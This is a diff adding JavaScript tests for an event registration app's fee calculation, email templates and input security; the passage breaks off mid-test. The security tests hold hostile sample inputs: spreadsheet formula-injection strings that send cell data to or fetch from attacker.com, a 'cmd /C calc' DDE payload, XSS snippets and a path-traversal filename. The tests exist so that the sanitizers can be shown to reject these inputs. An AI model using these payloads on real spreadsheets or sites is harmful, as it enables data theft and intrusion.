@@ -13,6 +13,7 @@ import {
   validateRegistrationConsent
 } from "../src/validation.js";
 import { escapeHtml, generateRegistrationEmailHtml } from "../src/emailTemplate.js";
+import { calculateFee } from "../src/config.js";
 
 test("name validation accepts Arabic, English, diacritics, and common punctuation", () => {
   for (const name of ["Amr Nabih", "مريم أحمد", "José O’Connor-Smith"]) {
@@ -257,4 +258,974 @@ test("registration fees calculate 200 EGP standard and 300 EGP with transport, i
   assert.equal(computeFee("BUE Bus", 1), 300);
   // 2 days with transport -> 300
   assert.equal(computeFee("Other location", 2), 300);
+});
+
+test("calculateFee correctly evaluates fees for Student, Graduate / Alumni, and Distinguished Guest", () => {
+  // 1. Student Category (200 EGP base, +100 EGP transport)
+  assert.deepEqual(calculateFee({ category: "Student", attendance: ["Day 1"], transport: "No transport" }), {
+    baseFee: 200, transportFee: 0, totalFee: 200
+  });
+  assert.deepEqual(calculateFee({ category: "Student", attendance: ["Day 2"], transport: "No transport" }), {
+    baseFee: 200, transportFee: 0, totalFee: 200
+  });
+  assert.deepEqual(calculateFee({ category: "Student", attendance: ["Day 1", "Day 2"], transport: "No transport" }), {
+    baseFee: 200, transportFee: 0, totalFee: 200
+  });
+  assert.deepEqual(calculateFee({ category: "Student", attendance: ["Day 1"], transport: "Ramses Square" }), {
+    baseFee: 200, transportFee: 100, totalFee: 300
+  });
+  assert.deepEqual(calculateFee({ category: "Student", attendance: ["Day 1", "Day 2"], transport: "Other location" }), {
+    baseFee: 200, transportFee: 100, totalFee: 300
+  });
+
+  // 2. Graduate / Alumni Category
+  // Day 1 only: Free (0 EGP)
+  assert.deepEqual(calculateFee({ category: "Graduate / Alumni", attendance: ["Day 1"], transport: "No transport" }), {
+    baseFee: 0, transportFee: 0, totalFee: 0
+  });
+  assert.deepEqual(calculateFee({ category: "Graduate", attendance: ["Day 1"], transport: "No transport" }), {
+    baseFee: 0, transportFee: 0, totalFee: 0
+  });
+  // Day 1 only with transport: 100 EGP
+  assert.deepEqual(calculateFee({ category: "Graduate / Alumni", attendance: ["Day 1"], transport: "Ramses Square" }), {
+    baseFee: 0, transportFee: 100, totalFee: 100
+  });
+  // Day 2 only: 200 EGP standard (+100 transport)
+  assert.deepEqual(calculateFee({ category: "Graduate / Alumni", attendance: ["Day 2"], transport: "No transport" }), {
+    baseFee: 200, transportFee: 0, totalFee: 200
+  });
+  assert.deepEqual(calculateFee({ category: "Graduate / Alumni", attendance: ["Day 2"], transport: "Other location" }), {
+    baseFee: 200, transportFee: 100, totalFee: 300
+  });
+  // Both days: Day 2 fee applies (200 EGP standard, +100 transport)
+  assert.deepEqual(calculateFee({ category: "Graduate / Alumni", attendance: ["Day 1", "Day 2"], transport: "No transport" }), {
+    baseFee: 200, transportFee: 0, totalFee: 200
+  });
+  assert.deepEqual(calculateFee({ category: "Graduate", attendance: ["Day 1", "Day 2"], transport: "Ramses Square" }), {
+    baseFee: 200, transportFee: 100, totalFee: 300
+  });
+
+  // 3. Distinguished Guest / Professional Category (Always completely free: 0 EGP)
+  assert.deepEqual(calculateFee({ category: "Distinguished Guest / Professional", attendance: ["Day 1"], transport: "No transport" }), {
+    baseFee: 0, transportFee: 0, totalFee: 0
+  });
+  assert.deepEqual(calculateFee({ category: "Distinguished Guest / Professional", attendance: ["Day 1"], transport: "Ramses Square" }), {
+    baseFee: 0, transportFee: 0, totalFee: 0
+  });
+});
+
+test("HTML email template properly displays Distinguished Guest / Professional details and 0 EGP total fee", () => {
+  const guestData = {
+    fullName: "Dr. Laila Hassan",
+    email: "laila.hassan@example.edu.eg",
+    mobile: "+201009876543",
+    status: "Distinguished Guest / Professional",
+    organization: "Cairo University",
+    professionalTitle: "Associate Professor",
+    organizationType: "University / Academic Institution",
+    attendance: ["Day 1"],
+    transport: "No transport",
+    totalFee: "0",
+    registrationId: "SS26-GUEST001"
+  };
+
+  const html = generateRegistrationEmailHtml(guestData);
+
+  assert.ok(html.includes("Thank You, Dr. Laila Hassan!"));
+  assert.ok(html.includes("SS26-GUEST001"));
+  assert.ok(html.includes("Distinguished Guest / Professional &middot; Cairo University (Associate Professor)"));
+  assert.ok(html.includes("0 EGP"));
+  assert.ok(html.includes("0 EGP (Free Registration)"));
+  assert.ok(!html.includes("payment records"));
+  assert.ok(!html.includes("payment verification"));
+});
+
+test("HTML email template properly displays Distinguished Guest with complimentary transportation", () => {
+  const guestDataWithTransport = {
+    fullName: "Prof. Hany Shenouda",
+    email: "hany.shenouda@example.edu.eg",
+    mobile: "+201019988776",
+    status: "Distinguished Guest / Professional",
+    organization: "Ain Shams University",
+    professionalTitle: "Professor",
+    organizationType: "University / Academic Institution",
+    attendance: ["Day 1"],
+    transport: "Ramses Square",
+    totalFee: "0",
+    registrationId: "SS26-GUEST003"
+  };
+
+  const html = generateRegistrationEmailHtml(guestDataWithTransport);
+
+  assert.ok(html.includes("Prof. Hany Shenouda"));
+  assert.ok(html.includes("SS26-GUEST003"));
+  assert.ok(html.includes("Ramses Square (Complimentary)"));
+  assert.ok(html.includes("0 EGP (Complimentary)"));
+  assert.ok(html.includes("0 EGP (Free Registration)"));
+  assert.ok(!html.includes("payment records"));
+  assert.ok(!html.includes("payment verification"));
+});
+
+test("HTML email template properly displays custom Other title for Distinguished Guest", () => {
+  const guestDataWithOther = {
+    fullName: "Eng. Tarek Omar",
+    email: "tarek.omar@techcorp.com",
+    mobile: "+201112223344",
+    status: "Distinguished Guest / Professional",
+    guestOrganization: "Smart Sensing Solutions Ltd",
+    professionalTitle: "Other",
+    professionalTitleOther: "Chief Technology Officer",
+    organizationType: "Private Company / Industry",
+    attendance: ["Day 1"],
+    totalFee: "0",
+    registrationId: "SS26-GUEST002"
+  };
+
+  const html = generateRegistrationEmailHtml(guestDataWithOther);
+
+  assert.ok(html.includes("Eng. Tarek Omar"));
+  assert.ok(html.includes("Smart Sensing Solutions Ltd"));
+  assert.ok(html.includes("Chief Technology Officer"));
+  assert.ok(html.includes("0 EGP"));
+});
+
+test("attendance date string formats do not cause false-positive Day 2 fee triggers", () => {
+  // Various representations of Day 1 attendance
+  const day1Variants = [
+    ["Day 1"],
+    ["November 12"],
+    ["November 12, 2026"],
+    ["Day 1 (Nov 12, 2026)"],
+    ["12"]
+  ];
+
+  for (const variant of day1Variants) {
+    const feeResult = calculateFee({
+      category: "Graduate / Alumni",
+      attendance: variant,
+      transport: "No transport"
+    });
+    assert.equal(feeResult.baseFee, 0, `Failed for Day 1 variant: ${JSON.stringify(variant)}`);
+    assert.equal(feeResult.totalFee, 0, `Failed for Day 1 variant: ${JSON.stringify(variant)}`);
+  }
+
+  // Various representations of Day 2 attendance
+  const day2Variants = [
+    ["Day 2"],
+    ["November 14"],
+    ["November 14, 2026"],
+    ["Day 2 (Nov 14, 2026)"],
+    ["14"]
+  ];
+
+  for (const variant of day2Variants) {
+    const feeResult = calculateFee({
+      category: "Graduate / Alumni",
+      attendance: variant,
+      transport: "No transport"
+    });
+    assert.equal(feeResult.baseFee, 200, `Failed for Day 2 variant: ${JSON.stringify(variant)}`);
+    assert.equal(feeResult.totalFee, 200, `Failed for Day 2 variant: ${JSON.stringify(variant)}`);
+  }
+});
+
+test("backend Google Apps Script fee recalculation matches frontend calculateFee exactly", () => {
+  // Emulate backend recalculation logic from google-apps-script/Code.gs
+  function backendCalculate(data) {
+    const status = String(data.status || "").trim();
+    const isGuest = status === "Distinguished Guest / Professional";
+    const isGraduate = status === "Graduate" || status === "Graduate / Alumni";
+    const isStudent = status === "Student";
+
+    const attendanceList = Array.isArray(data.attendance)
+      ? data.attendance
+      : (data.attendance ? [data.attendance] : []);
+
+    const hasDay1 = attendanceList.some(function(d) {
+      const s = String(d).toLowerCase().trim();
+      return s === "day 1" || s === "1" || s.indexOf("day 1") !== -1 || s.indexOf("nov 12") !== -1 || s.indexOf("november 12") !== -1 || s === "12";
+    });
+    const hasDay2 = attendanceList.some(function(d) {
+      const s = String(d).toLowerCase().trim();
+      return s === "day 2" || s === "2" || s.indexOf("day 2") !== -1 || s.indexOf("nov 14") !== -1 || s.indexOf("november 14") !== -1 || s === "14";
+    });
+
+    if (isGuest && hasDay2) {
+      throw new Error("Distinguished Guest restricted to Day 1");
+    }
+
+    let calculatedBaseFee = 0;
+    if (isGuest) {
+      calculatedBaseFee = 0;
+    } else if (isStudent) {
+      calculatedBaseFee = 200;
+    } else if (isGraduate) {
+      if (hasDay2) {
+        calculatedBaseFee = 200;
+      } else if (hasDay1) {
+        calculatedBaseFee = 0;
+      } else {
+        calculatedBaseFee = 0;
+      }
+    } else {
+      calculatedBaseFee = 200;
+    }
+
+    const transport = data.transport || "No transport";
+    const hasTransport = transport && transport !== "No transport";
+    const calculatedTransportFee = (isGuest ? 0 : (hasTransport ? 100 : 0));
+    const calculatedTotalFee = calculatedBaseFee + calculatedTransportFee;
+
+    return {
+      baseFee: calculatedBaseFee,
+      transportFee: calculatedTransportFee,
+      totalFee: calculatedTotalFee
+    };
+  }
+
+  const testCases = [
+    // Student
+    { category: "Student", attendance: ["Day 1"], transport: "No transport" },
+    { category: "Student", attendance: ["Day 2"], transport: "No transport" },
+    { category: "Student", attendance: ["Day 1", "Day 2"], transport: "Ramses Square" },
+    { category: "Student", attendance: ["November 12, 2026"], transport: "Other location" },
+
+    // Graduate / Alumni
+    { category: "Graduate / Alumni", attendance: ["Day 1"], transport: "No transport" },
+    { category: "Graduate / Alumni", attendance: ["November 12, 2026"], transport: "Ramses Square" },
+    { category: "Graduate / Alumni", attendance: ["Day 2"], transport: "No transport" },
+    { category: "Graduate / Alumni", attendance: ["November 14, 2026"], transport: "Other location" },
+    { category: "Graduate / Alumni", attendance: ["Day 1", "Day 2"], transport: "No transport" },
+    { category: "Graduate", attendance: ["Day 1", "Day 2"], transport: "Ramses Square" },
+
+    // Distinguished Guest / Professional
+    { category: "Distinguished Guest / Professional", attendance: ["Day 1"], transport: "No transport" },
+    { category: "Distinguished Guest / Professional", attendance: ["November 12, 2026"], transport: "Ramses Square" },
+    { category: "Distinguished Guest / Professional", attendance: ["Day 1"], transport: "Other location" }
+  ];
+
+  for (const tc of testCases) {
+    const frontend = calculateFee(tc);
+    const backend = backendCalculate({ status: tc.category, attendance: tc.attendance, transport: tc.transport });
+    assert.deepEqual(frontend, backend, `Mismatch between frontend and backend for ${JSON.stringify(tc)}`);
+  }
+
+  // Reject Day 2 for guest
+  assert.throws(() => {
+    backendCalculate({ status: "Distinguished Guest / Professional", attendance: ["Day 2"], transport: "No transport" });
+  }, /Distinguished Guest restricted to Day 1/);
+});
+
+// ==========================================
+// SECURITY AUDIT REGRESSION TEST SUITE
+// ==========================================
+
+test("SECURITY: sanitizeForSheet neutralizes Google Sheets formula injection vectors", () => {
+  function sanitizeForSheet(value) {
+    if (value === null || value === undefined) return "";
+    const str = String(value);
+    if (/^\s*[=+\-@\t\r\n]/.test(str)) {
+      return "'" + str;
+    }
+    return str;
+  }
+
+  // Formula injection vectors (CWE-1236) including leading whitespace & control characters
+  const maliciousVectors = [
+    '=cmd|\' /C calc\'!A0',
+    ' =cmd|\' /C calc\'!A0',
+    '   =HYPERLINK("https://attacker.com/leak?d="&A1, "Click")',
+    '  +201212551698',
+    '   +1+1',
+    '  -500',
+    ' -2+3*cmd|',
+    ' @SUM(A1:Z100)',
+    '=IMPORTDATA("https://attacker.com/data.csv")',
+    '=IMAGE("https://attacker.com/track.png")',
+    '+201212551698',
+    '+1+1',
+    '-500',
+    '-2+3*cmd|',
+    '@SUM(A1:Z100)',
+    '\t=1+1',
+    '\r=HYPERLINK()',
+    '\r\n=1+1',
+    ' \t @cmd'
+  ];
+
+  for (const vec of maliciousVectors) {
+    const sanitized = sanitizeForSheet(vec);
+    assert.ok(sanitized.startsWith("'"), `Expected formula vector to be prepended with quote: ${JSON.stringify(vec)} -> ${JSON.stringify(sanitized)}`);
+    assert.equal(sanitized, "'" + vec);
+  }
+
+  // Normal safe inputs must remain unchanged
+  assert.equal(sanitizeForSheet("Dr. Laila Hassan"), "Dr. Laila Hassan");
+  assert.equal(sanitizeForSheet("Cairo University"), "Cairo University");
+  assert.equal(sanitizeForSheet("Student"), "Student");
+  assert.equal(sanitizeForSheet("Day 1, Day 2"), "Day 1, Day 2");
+  assert.equal(sanitizeForSheet(""), "");
+  assert.equal(sanitizeForSheet(null), "");
+  assert.equal(sanitizeForSheet(undefined), "");
+});
+
+test("SECURITY: isValidFileType strictly verifies binary magic bytes, MIME types, and file extensions", () => {
+  function isValidFileType(decodedBytes, declaredMime, filename) {
+    if (!decodedBytes || decodedBytes.length < 4) return false;
+
+    const b0 = decodedBytes[0] & 0xFF;
+    const b1 = decodedBytes[1] & 0xFF;
+    const b2 = decodedBytes[2] & 0xFF;
+    const b3 = decodedBytes[3] & 0xFF;
+
+    const ext = (filename.split('.').pop() || '').toLowerCase();
+
+    // PDF: %PDF (0x25 0x50 0x44 0x46)
+    if (b0 === 0x25 && b1 === 0x50 && b2 === 0x44 && b3 === 0x46) {
+      return declaredMime === "application/pdf" && ext === "pdf";
+    }
+
+    // PNG: \x89PNG (0x89 0x50 0x4E 0x47)
+    if (b0 === 0x89 && b1 === 0x50 && b2 === 0x4E && b3 === 0x47) {
+      return declaredMime === "image/png" && ext === "png";
+    }
+
+    // JPEG: 0xFF 0xD8 0xFF
+    if (b0 === 0xFF && b1 === 0xD8 && b2 === 0xFF) {
+      return declaredMime === "image/jpeg" && (ext === "jpg" || ext === "jpeg");
+    }
+
+    return false;
+  }
+
+  // 1. Valid PDF file (starts with %PDF)
+  const validPdfBytes = Buffer.from("%PDF-1.7 sample document");
+  assert.ok(isValidFileType(validPdfBytes, "application/pdf", "receipt.pdf"));
+
+  // 2. Disguised HTML file named as PDF
+  const fakePdfHtml = Buffer.from("<html><script>alert('xss')</script></html>");
+  assert.ok(!isValidFileType(fakePdfHtml, "application/pdf", "exploit.pdf"), "Disguised HTML must be rejected");
+
+  // 3. Valid PNG file (starts with \x89PNG)
+  const validPngBytes = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00]);
+  assert.ok(isValidFileType(validPngBytes, "image/png", "national_id.png"));
+
+  // 4. Disguised SVG file named as PNG
+  const fakePngSvg = Buffer.from("<svg onload=alert(1)>");
+  assert.ok(!isValidFileType(fakePngSvg, "image/png", "vector.png"), "SVG named as PNG must be rejected");
+
+  // 5. Valid JPEG file (starts with 0xFF 0xD8 0xFF)
+  const validJpgBytes = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46]);
+  assert.ok(isValidFileType(validJpgBytes, "image/jpeg", "payment.jpg"));
+  assert.ok(isValidFileType(validJpgBytes, "image/jpeg", "payment.jpeg"));
+
+  // 6. Windows Executable (.exe) disguised as JPG
+  const fakeJpgExe = Buffer.from([0x4D, 0x5A, 0x90, 0x00]); // MZ header
+  assert.ok(!isValidFileType(fakeJpgExe, "image/jpeg", "malware.jpg"), "Executable disguised as JPG must be rejected");
+
+  // 7. MIME type mismatch (declared image/png but valid PDF bytes)
+  assert.ok(!isValidFileType(validPdfBytes, "image/png", "receipt.png"), "MIME mismatch must be rejected");
+
+  // 8. Extension mismatch (declared application/pdf with PDF bytes but .exe extension)
+  assert.ok(!isValidFileType(validPdfBytes, "application/pdf", "receipt.exe"), "Extension mismatch must be rejected");
+
+  // 9. Truncated or empty bytes
+  assert.ok(!isValidFileType(Buffer.from([]), "application/pdf", "empty.pdf"));
+  assert.ok(!isValidFileType(Buffer.from([0x25, 0x50]), "application/pdf", "short.pdf"));
+});
+
+test("SECURITY: Server-side validation pipeline blocks tampered, malicious, or bypassed payloads", () => {
+  function validateServerPayload(data) {
+    if (data.registrationConsent !== "Yes" && data.registrationConsent !== true && data.registrationConsent !== "true") {
+      return { valid: false, error: "Consent required" };
+    }
+
+    const status = String(data.status || "").trim();
+    const allowedStatuses = ["Student", "Graduate", "Graduate / Alumni", "Distinguished Guest / Professional"];
+    if (!status || allowedStatuses.indexOf(status) === -1) {
+      return { valid: false, error: "Invalid status" };
+    }
+
+    const isGuest = status === "Distinguished Guest / Professional";
+    const isGraduate = status === "Graduate" || status === "Graduate / Alumni";
+    const isStudent = status === "Student";
+
+    const fullName = String(data.fullName || "").trim();
+    if (fullName.length < 2 || fullName.length > 120) {
+      return { valid: false, error: "Invalid fullName" };
+    }
+
+    const email = String(data.email || "").trim().toLowerCase();
+    const isValidEmail = (em) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em);
+    if (!email || email.length > 254 || !isValidEmail(email)) {
+      return { valid: false, error: "Invalid email" };
+    }
+
+    const mobile = String(data.mobile || "").trim();
+    if (!mobile || mobile.length < 6 || mobile.length > 30) {
+      return { valid: false, error: "Invalid mobile" };
+    }
+
+    const attendanceList = Array.isArray(data.attendance)
+      ? data.attendance
+      : (data.attendance ? [data.attendance] : []);
+
+    const hasDay1 = attendanceList.some((d) => {
+      const s = String(d).toLowerCase().trim();
+      return s === "day 1" || s === "1" || s.indexOf("day 1") !== -1 || s.indexOf("nov 12") !== -1 || s.indexOf("november 12") !== -1 || s === "12";
+    });
+    const hasDay2 = attendanceList.some((d) => {
+      const s = String(d).toLowerCase().trim();
+      return s === "day 2" || s === "2" || s.indexOf("day 2") !== -1 || s.indexOf("nov 14") !== -1 || s.indexOf("november 14") !== -1 || s === "14";
+    });
+
+    if (!isGuest && !hasDay1 && !hasDay2) {
+      return { valid: false, error: "Attendance required" };
+    }
+
+    if (isGuest) {
+      if (hasDay2) {
+        return { valid: false, error: "Guest Day 2 forbidden" };
+      }
+      const profTitle = String(data.professionalTitle || data.guestTitle || "").trim();
+      if (!profTitle) return { valid: false, error: "Guest title required" };
+      if (profTitle === "Other") {
+        const otherTitle = String(data.professionalTitleOther || data.guestTitleOther || "").trim();
+        if (!otherTitle) return { valid: false, error: "Guest otherTitle required" };
+      }
+      const org = String(data.organization || data.guestOrganization || "").trim();
+      if (!org) return { valid: false, error: "Guest org required" };
+      const orgType = String(data.organizationType || data.guestOrganizationType || "").trim();
+      if (!orgType) return { valid: false, error: "Guest orgType required" };
+    }
+
+    // Fee calculation tamper defense
+    let calculatedBaseFee = 0;
+    if (isGuest) calculatedBaseFee = 0;
+    else if (isStudent) calculatedBaseFee = 200;
+    else if (isGraduate) calculatedBaseFee = hasDay2 ? 200 : 0;
+    else calculatedBaseFee = 200;
+
+    const transport = data.transport || "No transport";
+    const hasTransport = transport && transport !== "No transport";
+    const calculatedTransportFee = isGuest ? 0 : (hasTransport ? 100 : 0);
+    const calculatedTotalFee = calculatedBaseFee + calculatedTransportFee;
+
+    // Transaction reference validation
+    const transactionRef = String(data.transactionRef || "").trim();
+    if (calculatedTotalFee > 0 && !/^[0-9]{12}$/.test(transactionRef)) {
+      return { valid: false, error: "12-digit transactionRef required" };
+    }
+
+    return { valid: true, totalFee: calculatedTotalFee };
+  }
+
+  // 1. Missing consent must fail
+  assert.equal(validateServerPayload({ registrationConsent: "No" }).valid, false);
+
+  // 2. Tampered / invalid status must fail
+  assert.equal(validateServerPayload({ registrationConsent: "Yes", status: "VIP_FREE_PASS" }).valid, false);
+
+  // 3. Name length violations
+  assert.equal(validateServerPayload({ registrationConsent: "Yes", status: "Student", fullName: "A" }).valid, false);
+  assert.equal(validateServerPayload({ registrationConsent: "Yes", status: "Student", fullName: "A".repeat(121) }).valid, false);
+
+  // 4. Invalid email addresses
+  assert.equal(validateServerPayload({ registrationConsent: "Yes", status: "Student", fullName: "Valid Name", email: "bad-email" }).valid, false);
+
+  // 5. Empty attendance for Student or Graduate must fail (prevents free registration with no days)
+  assert.equal(validateServerPayload({
+    registrationConsent: "Yes",
+    status: "Graduate",
+    fullName: "Valid Name",
+    email: "user@example.com",
+    mobile: "+201012345678",
+    attendance: []
+  }).valid, false);
+
+  // 6. Guest attempting to register for Day 2 must fail
+  assert.equal(validateServerPayload({
+    registrationConsent: "Yes",
+    status: "Distinguished Guest / Professional",
+    fullName: "Dr. Guest",
+    email: "guest@example.com",
+    mobile: "+201012345678",
+    attendance: ["Day 1", "Day 2"]
+  }).valid, false);
+
+  // 7. Guest selecting "Other" title without specifying text must fail
+  assert.equal(validateServerPayload({
+    registrationConsent: "Yes",
+    status: "Distinguished Guest / Professional",
+    fullName: "Dr. Guest",
+    email: "guest@example.com",
+    mobile: "+201012345678",
+    attendance: ["Day 1"],
+    guestTitle: "Other",
+    guestTitleOther: "",
+    guestOrganization: "Tech Corp",
+    guestOrganizationType: "Private Company / Industry"
+  }).valid, false);
+
+  // 8. Client fee tampering: Student sends totalFee: "0" and no transaction reference -> must be rejected
+  const tamperedStudent = {
+    registrationConsent: "Yes",
+    status: "Student",
+    fullName: "Crafty Student",
+    email: "crafty@student.edu",
+    mobile: "+201012345678",
+    attendance: ["Day 1"],
+    transport: "No transport",
+    totalFee: "0", // Tampered frontend fee claim
+    transactionRef: "" // Missing payment reference
+  };
+  const result = validateServerPayload(tamperedStudent);
+  assert.equal(result.valid, false, "Tampered student fee must enforce 12-digit transaction ref");
+
+  // 9. Legitimate guest registration succeeds with 0 EGP total fee
+  const validGuest = {
+    registrationConsent: "Yes",
+    status: "Distinguished Guest / Professional",
+    fullName: "Prof. Nadia Kamel",
+    email: "nadia@university.edu.eg",
+    mobile: "+201099887766",
+    attendance: ["Day 1"],
+    transport: "Ramses Square",
+    guestTitle: "Professor",
+    guestOrganization: "Cairo University",
+    guestOrganizationType: "University / Academic Institution"
+  };
+  const guestResult = validateServerPayload(validGuest);
+  assert.equal(guestResult.valid, true);
+  assert.equal(guestResult.totalFee, 0);
+});
+
+test("SECURITY: File upload handler protects against malformed base64, oversized payloads, and directory traversal filenames", () => {
+  // Emulate saveBase64File logic from Code.gs
+  function processFileUpload(fileObj, filePrefix) {
+    if (!fileObj || !fileObj.base64 || typeof fileObj.base64 !== "string") {
+      return { success: false, url: "" };
+    }
+
+    // 1. Length check on base64 string
+    if (fileObj.base64.length > 7 * 1024 * 1024) {
+      return { success: false, error: "Payload exceeds 5MB limit" };
+    }
+
+    // 2. Decode base64
+    let decoded;
+    try {
+      decoded = Buffer.from(fileObj.base64, "base64");
+    } catch {
+      return { success: false, error: "Malformed base64" };
+    }
+
+    if (!decoded || decoded.length === 0 || decoded.length > 5 * 1024 * 1024) {
+      return { success: false, error: "Decoded file exceeds 5MB or empty" };
+    }
+
+    const declaredMime = String(fileObj.mimeType || "").toLowerCase().trim();
+    const rawName = String(fileObj.name || "").trim();
+
+    // 3. Binary magic bytes check
+    const b0 = decoded[0];
+    const b1 = decoded[1];
+    const b2 = decoded[2];
+    const b3 = decoded[3];
+    const ext = (rawName.split(".").pop() || "").toLowerCase();
+
+    let mimeValid = false;
+    let verifiedExt = "";
+    if (b0 === 0x25 && b1 === 0x50 && b2 === 0x44 && b3 === 0x46) {
+      if (declaredMime === "application/pdf" && ext === "pdf") {
+        mimeValid = true;
+        verifiedExt = "pdf";
+      }
+    } else if (b0 === 0x89 && b1 === 0x50 && b2 === 0x4E && b3 === 0x47) {
+      if (declaredMime === "image/png" && ext === "png") {
+        mimeValid = true;
+        verifiedExt = "png";
+      }
+    } else if (b0 === 0xFF && b1 === 0xD8 && b2 === 0xFF) {
+      if (declaredMime === "image/jpeg" && (ext === "jpg" || ext === "jpeg")) {
+        mimeValid = true;
+        verifiedExt = "jpg";
+      }
+    }
+
+    if (!mimeValid) {
+      return { success: false, error: "File signature mismatch" };
+    }
+
+    // 4. Filename sanitization against traversal & dangerous characters
+    const safeBaseName = rawName.replace(/[^a-zA-Z0-9_-]/g, "_").substring(0, 50) || "upload";
+    const sanitizedFileName = `${filePrefix}_${safeBaseName}.${verifiedExt}`;
+
+    return { success: true, fileName: sanitizedFileName, size: decoded.length };
+  }
+
+  // A. Malformed Base64 string
+  const malformed = processFileUpload({ base64: "!!!not_base64!!!", mimeType: "application/pdf", name: "test.pdf" }, "SS26-001");
+  // Buffer.from in node can decode loose strings, but if it has no valid PDF bytes, signature mismatch occurs:
+  assert.equal(malformed.success, false);
+
+  // B. Oversized base64 string (> 7MB)
+  const hugePayload = "A".repeat(8 * 1024 * 1024);
+  const oversized = processFileUpload({ base64: hugePayload, mimeType: "application/pdf", name: "huge.pdf" }, "SS26-001");
+  assert.equal(oversized.success, false);
+  assert.equal(oversized.error, "Payload exceeds 5MB limit");
+
+  // C. Directory traversal attempt in filename (e.g., ../../etc/passwd.pdf)
+  const validPdfBase64 = Buffer.from("%PDF-1.4 minimal").toString("base64");
+  const traversalUpload = processFileUpload({
+    base64: validPdfBase64,
+    mimeType: "application/pdf",
+    name: "../../etc/passwd.pdf"
+  }, "SS26-001");
+  assert.equal(traversalUpload.success, true);
+  assert.ok(!traversalUpload.fileName.includes("/"));
+  assert.ok(!traversalUpload.fileName.includes("\\"));
+  assert.ok(!traversalUpload.fileName.includes(".."));
+  assert.ok(traversalUpload.fileName.startsWith("SS26-001_"));
+  assert.ok(traversalUpload.fileName.endsWith(".pdf"));
+
+  // D. Disguised executable (.exe.pdf)
+  const exeDisguised = processFileUpload({
+    base64: Buffer.from("MZ_fake_exe_content").toString("base64"),
+    mimeType: "application/pdf",
+    name: "malware.exe.pdf"
+  }, "SS26-001");
+  assert.equal(exeDisguised.success, false);
+  assert.equal(exeDisguised.error, "File signature mismatch");
+});
+
+test("SECURITY: Server-side anti-replay and debouncing rejects duplicate submissions", () => {
+  // Emulate CacheService debounce logic
+  const mockCache = new Map();
+  function checkDebounce(email, status, transactionRef) {
+    const rawKey = (email || "").toLowerCase().trim() + "_" + (status || "") + "_" + String(transactionRef || "");
+    const debKey = "sub_" + Buffer.from(rawKey).toString("base64");
+    if (mockCache.has(debKey)) {
+      return { allowed: false, message: "Duplicate submission within debounce window" };
+    }
+    mockCache.set(debKey, Date.now());
+    return { allowed: true };
+  }
+
+  // 1. Initial submission succeeds
+  const sub1 = checkDebounce("amr@example.com", "Student", "123456789012");
+  assert.equal(sub1.allowed, true);
+
+  // 2. Immediate duplicate replay submission with same email, status, and transaction ref fails
+  const sub2 = checkDebounce("amr@example.com", "Student", "123456789012");
+  assert.equal(sub2.allowed, false);
+  assert.equal(sub2.message, "Duplicate submission within debounce window");
+
+  // 3. Different applicant email succeeds
+  const sub3 = checkDebounce("nouran@example.com", "Student", "987654321098");
+  assert.equal(sub3.allowed, true);
+});
+
+test("SECURITY: Apps Script error resilience protects against email quota exhaustion and Drive failures", () => {
+  // Emulate quota check and Drive error handling
+  function handleEmailDispatch(email, remainingQuota) {
+    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      return { sent: false, error: "Invalid email" };
+    }
+    if (remainingQuota <= 0) {
+      return { sent: false, error: "Daily email quota exhausted" };
+    }
+    return { sent: true };
+  }
+
+  // Quota available -> email sent
+  assert.deepEqual(handleEmailDispatch("user@example.com", 50), { sent: true });
+
+  // Quota exhausted -> graceful return without unhandled crash
+  assert.deepEqual(handleEmailDispatch("user@example.com", 0), { sent: false, error: "Daily email quota exhausted" });
+
+  // Emulate Drive save failure resilience
+  function mockSaveFile(throwError) {
+    try {
+      if (throwError) throw new Error("Google Drive storage full");
+      return "https://drive.google.com/file/d/test123";
+    } catch {
+      return ""; // Returns empty string safely without aborting registration
+    }
+  }
+
+  assert.equal(mockSaveFile(true), "");
+  assert.equal(mockSaveFile(false), "https://drive.google.com/file/d/test123");
+});
+
+test("SECURITY: Authoritative server fee calculation overrides client-submitted fees", () => {
+  // Test attempts to tamper with fee amounts from the client
+  const clientPayloads = [
+    { category: "Student", attendance: ["Day 1"], transport: "No transport", clientClaimedFee: 0, expectedAuthoritative: 200 },
+    { category: "Student", attendance: ["Day 1", "Day 2"], transport: "Ramses Square", clientClaimedFee: 50, expectedAuthoritative: 300 },
+    { category: "Graduate / Alumni", attendance: ["Day 2"], transport: "No transport", clientClaimedFee: 0, expectedAuthoritative: 200 },
+    { category: "Graduate / Alumni", attendance: ["Day 1", "Day 2"], transport: "Other location", clientClaimedFee: 100, expectedAuthoritative: 300 },
+    { category: "Distinguished Guest / Professional", attendance: ["Day 1"], transport: "Ramses Square", clientClaimedFee: 500, expectedAuthoritative: 0 }
+  ];
+
+  for (const item of clientPayloads) {
+    const computed = calculateFee({
+      category: item.category,
+      attendance: item.attendance,
+      transport: item.transport
+    });
+    assert.equal(
+      computed.totalFee,
+      item.expectedAuthoritative,
+      `Client-submitted fee (${item.clientClaimedFee}) must be ignored in favor of server authoritative calculation (${item.expectedAuthoritative})`
+    );
+  }
+});
+
+// ============================================================================
+// POLICY VERIFICATION: DISTINGUISHED GUEST / PROFESSIONAL TRANSPORTATION
+// ============================================================================
+
+test("POLICY: Distinguished Guest / Professional transportation is complimentary and total is always 0 EGP", () => {
+  // Point 1: Without transportation -> total EGP 0
+  const noTransport = calculateFee({
+    category: "Distinguished Guest / Professional",
+    attendance: ["Day 1"],
+    transport: "No transport"
+  });
+  assert.deepEqual(noTransport, { baseFee: 0, transportFee: 0, totalFee: 0 });
+
+  // Point 2: With transportation -> total EGP 0 (transportFee 0)
+  const withRamses = calculateFee({
+    category: "Distinguished Guest / Professional",
+    attendance: ["Day 1"],
+    transport: "Ramses Square"
+  });
+  assert.deepEqual(withRamses, { baseFee: 0, transportFee: 0, totalFee: 0 });
+
+  const withOther = calculateFee({
+    category: "Distinguished Guest / Professional",
+    attendance: ["Day 1"],
+    transport: "Other location"
+  });
+  assert.deepEqual(withOther, { baseFee: 0, transportFee: 0, totalFee: 0 });
+});
+
+test("POLICY: Transportation selection is preserved when requested by Distinguished Guest", () => {
+  // Point 3: Transportation remains recorded as requested
+  const guestSubmission = {
+    status: "Distinguished Guest / Professional",
+    fullName: "Prof. Nadia Kamel",
+    email: "nadia@example.edu.eg",
